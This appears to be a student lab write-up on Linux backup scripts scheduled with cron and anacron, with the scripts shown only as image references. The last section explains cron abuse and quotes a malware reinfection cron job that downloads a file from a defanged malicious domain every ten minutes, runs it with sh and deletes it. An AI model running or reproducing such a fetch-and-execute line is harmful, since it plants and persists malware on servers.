### Questions to answer:
1. 
    ***Part 1:***
    
    Let's first create a script `backup.sh` to make our backups:

    ![image](1.png)

    Testing the script to see if everything is working as intended:

    ![image](3.png)

    We can now create a cronjob to run our script:

    ![image](2.png)

    ***Part 2:***

    Our second script `backup2.sh` looks very similar to the first with the exception of deleting the old if it exists previously:

    ![image](4.png)

    Testing the script to see if everything is working as intended:

    ![image](5.png)

    We can now create an anacron job to run our script:

    ![image](6.png)

2.  After installing `nginx`, we can take a look at the file we want to back up:

    ![image](7.png)

    Let's edit our previous script to back up this directory:

    ![image](8.png)

    Testing the script to see if everything is working as intended:

    ![image](9.png)

    We can now create a cronjob to run our script:

    ![image](10.png)

3. Let's first create some scripts for our cronjobs to run:

    ![image](11.png)
    ![image](12.png)
    ![image](13.png)
    ![image](14.png)

    We can now create cronjobs to run our scripts:

    ![image](15.png)

4. Cronjobs can be abused in a multitude of ways, `Cron Privilege Escalation` and `Reinfection Abuse` to name a few. 

    A good example here is `AnonymousFox`â€™s reinfection abuse where they use a cron job to reinfect someone within a very short period of time.
    Such reinfection can cause malicious behavior such as running malicious processes, interfering with server operations, etc.

    The cronjob itself looks something like this:

        */10 * * * * curl -so gojj hxxp://golang666[.]xyz/css[.]index && /bin/sh gojj /home/[REDACTED]/public_html/[REDACTED] && rm -f gojj
    
    - ***Execution frequency:*** */10 * * * * which runs the command every 10 minutes 
    - ***Command:*** `curl`
    - ***Objective:*** Grabbing content from a malware domain that gets extracted into ./css/index.php
